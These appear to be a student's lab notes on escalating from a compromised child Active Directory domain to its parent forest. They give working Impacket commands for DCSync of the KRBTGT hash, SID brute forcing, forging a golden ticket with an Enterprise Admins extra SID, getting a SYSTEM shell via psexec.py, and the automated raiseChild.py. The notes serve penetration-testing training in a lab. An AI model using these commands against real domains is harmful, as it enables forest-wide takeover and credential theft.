## Manual Method

- This is the same type of attack as [[24. Attacking Domain Trusts (Child-Parent)- from Windows]]
- We still need to gather:
	- The KRBTGT NTLM hash for the child domain
	- The SID for the child domain
	- The name of a target user in the child domain (doesn't need to exist)
	- The FQDN of the child domain
	- The SID of the Eneterprise Admins group of the root domain

- Once we have control of the child domain, `LOGISTICS.INLANEFREIGHT.LOCAL` we can use `secretsdump.py` to DCSync and grab the NTLM hash for the KRBTGT account.

#### Performing DCSync with secretsdump.py
``` bash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```


#### Performing SID Brute Forcing using lookupsid.py
- We can use [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py) from the Impacket toolkit to perform SID brute forcing to find the SID of the child domain. 
- Whatever we specify for the IP address (the IP of the domain controller in the child domain) will become the target domain for a SID lookup. 
	- The tool will give us back the SID for the domain and the RIDs for each user and group that could be used to create their SID in the format `DOMAIN_SID-RID`.
	- For example, from the output below, we can see that the SID of the `lab_adm` user would be `S-1-5-21-2806153819-209893948-922872689-1001`.

``` bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 
```

![[2023-04-26 14_33_46-Hack The Box - Academy.png|600]]

#### Filtering for the Domain SID
``` bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
```

#### Grabbing the Domain SID & Attaching to Enterprise Admin's RID
- Next, we can rerun the command, targeting the INLANEFREIGHT Domain Controller (DC01) at 172.16.5.5 and grab the domain `SID S-1-5-21-3842939050-3880317879-2865463114` and attach the RID of the Enterprise Admins group. 
	- [Here](https://adsecurity.org/?p=1001) is a handy list of well-known SIDs.
``` bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```


#### Constructing a Golden Ticket using ticketer.py
``` bash
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```

- This ticket will be valid to access resources in the child domain (specified by `-domain-sid`) and the parent domain (specified by `-extra-sid`).
	- The ticket will be saved as a `ccache` file. Setting the `KRB5CCNAME` env variable has the system use this file for Kerberos auth attempts.

Setting the KRB5CCNAME Environment Variable
``` bash
export KRB5CCNAME=hacker.ccache 
```

#### Getting a SYSTEM shell using Impacket's psexec.py
``` bash
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```
___

## raiseChild.py (Automated)

Impacket also has the tool [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py), which will automate escalating from child to parent domain. We need to specify the target domain controller and credentials for an administrative user in the child domain; the script will do the rest. If we walk through the output, we see that it starts by listing out the child and parent domain's fully qualified domain names (FQDN). It then:

-   Obtains the SID for the Enterprise Admins group of the parent domain
-   Retrieves the hash for the KRBTGT account in the child domain
-   Creates a Golden Ticket
-   Logs into the parent domain
-   Retrieves credentials for the Administrator account in the parent domain

Finally, if the `target-exec` switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.

#### Performing the attack with raiseChild.py
``` bash
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

>In a client production environment, we should **`always`** be careful when running any sort of "autopwn" script like this, and always remain cautious and construct commands manually when possible. Other tools exist which can take in data from a tool such as BloodHound, identify attack paths, and perform an "autopwn" function that can attempt to perform each action in an attack chain to elevate us to Domain Admin (such as a long ACL attack path). I would recommend avoiding tools such as these and work with tools that you understand fully, and will also give you the greatest degree of control throughout the process.